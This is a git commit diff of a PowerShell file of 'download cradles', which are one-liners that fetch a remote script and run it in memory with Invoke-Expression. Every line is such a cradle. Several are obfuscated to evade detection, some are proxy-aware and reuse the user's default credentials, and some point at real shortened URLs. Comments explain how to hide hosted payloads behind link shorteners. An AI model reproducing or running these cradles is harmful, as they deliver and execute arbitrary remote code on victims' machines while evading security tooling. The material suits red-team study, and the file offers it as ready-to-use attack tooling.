75049425265047a2e2554965f65c690d7e40348d
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-24 18:23:05 +0100

    Update Download_Cradles.ps1

--- Download_Cradles.ps1
+++ Download_Cradles.ps1
@@ -1,23 +1,28 @@
 # not proxy aware download cradles 
 
 # default download cradle 
-IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
+IEX (New-Object Net.Webclient).downloadstring("http://server/payload.ps1")
 
-# obfuscated v1
-(New-Object Net.WebClient).DownloadString('http://EVIL/evil.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')
+# obfuscated 
+(New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')
 
-# obfuscated v2
-$ExecutionContext|ForEach{(GV _).Value.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|Where-Object{(GV _).Value.Name-ilike'*v*ip*'}).Name)((([Char[]][System.Net.WebClient]::New().DownloadData('http://EVIL/evil.ps1'))-Join''))}
+# obfuscted
+$ExecutionContext|ForEach{(GV _).Value.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|Where-Object{(GV _).Value.Name-ilike'*v*ip*'}).Name)((([Char[]][System.Net.WebClient]::New().DownloadData('http://server/payload.ps1'))-Join''))}
 
-# obfuscated v3
-(New-Object Net.WebClient).DownloadString('https://cutt.ly/syFzILs')|.$ExecutionContext.(($ExecutionContext|Member)[6].Name).GetCmdlet($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-like'*man*Name'}).Name).Invoke('*ke-*pr*',1,$TRUE))
+
+# Info: Because you are limited in length, you have to use a shortcut link to the raw link from your hosted payload on Github
+# For example, https://cutt.ly/syFzILH directs to the raw link of hosted payload on github
+# obfuscated 
+(New-Object Net.WebClient).DownloadString('https://cutt.ly/syFzILH')|.$ExecutionContext.(($ExecutionContext|Member)[6].Name).GetCmdlet($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-like'*man*Name'}).Name).Invoke('*ke-*pr*',1,$TRUE))
 
 
 
 # proxy aware download cradles
+# Info: Because you are limited in length, you have to use a shortcut link to the raw link from your hosted payload on Github
+# For example, https://cutt.ly/syFzILH directs to the raw link of hosted payload on github
 
 # default download cradle 
-$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $c.downloadstring("https://cutt.ly/syFzILs")
+$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iEx $c.downloadstring("https://cutt.ly/syFzILH")
 
 # obfuscated v1
-$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;`i`e`x $c.downloadstring("ht"+"tps://cutt.ly/syFzILs")
+$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;`i`E`x $c.downloadstring("ht"+"tps://cutt.ly/syFzILH")
